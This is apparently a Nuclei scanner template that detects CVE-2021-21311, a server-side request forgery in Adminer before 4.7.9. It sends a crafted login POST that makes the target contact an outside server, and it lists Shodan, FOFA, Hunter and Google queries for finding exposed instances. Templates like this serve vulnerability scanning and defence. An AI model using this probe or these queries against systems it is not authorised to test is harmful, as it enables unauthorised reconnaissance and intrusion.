http:
- attack: batteringram
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - <title>400 - Bad Request</title>
    - '&lt;title&gt;400 - Bad Request&lt;/title&gt;'
  - status:
    - 403
    type: status
  matchers-condition: and
  max-redirects: 1
  payloads:
    path:
    - /index.php
    - /adminer.php
    - /adminer/adminer.php
    - /adminer/index.php
    - /_adminer.php
    - /_adminer/index.php
  raw:
  - 'POST {{path}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    auth[driver]=elastic&auth[server]=example.org&auth[username]={{to_lower(rand_base(8))}}&auth[password]={{to_lower(rand_base(8))}}&auth[db]={{to_lower(rand_base(8))}}

    '
  redirects: true
  stop-at-first-match: true
id: CVE-2021-21311
info:
  author: Adam Crosser,pwnhxl
  classification:
    cpe: cpe:2.3:a:adminer:adminer:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-21311
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-918
    epss-percentile: 0.99861
    epss-score: 0.93872
  description: Adminer before 4.7.9 is susceptible to server-side request forgery
    due to exposure of sensitive information in error messages. Users of Adminer versions
    bundling all drivers, e.g. adminer.php, are affected. An attacker can possibly
    obtain this information, modify data, and/or execute unauthorized administrative
    operations in the context of the affected site.
  impact: 'Successful exploitation of this vulnerability could lead to unauthorized
    access to internal resources and potential data leakage.

    '
  metadata:
    fofa-query:
    - app="Adminer" && body="4.7.8"
    - title="login - adminer"
    - app="adminer" && body="4.7.8"
    google-query: intitle:"login - adminer"
    hunter-query:
    - app.name="Adminer"&&web.body="4.7.8"
    - app.name="adminer"&&web.body="4.7.8"
    max-request: 6
    product: adminer
    shodan-query:
    - title:"Login - Adminer"
    - cpe:"cpe:2.3:a:adminer:adminer"
    - http.title:"login - adminer"
    vendor: adminer
  name: Adminer <4.7.9 - Server-Side Request Forgery
  reference:
  - https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6
  - https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf
  - https://packagist.org/packages/vrana/adminer
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21311
  - https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351
  remediation: Upgrade to version 4.7.9 or later.
  severity: high
  tags: cve2021,cve,adminer,ssrf,vkev,kev,vuln
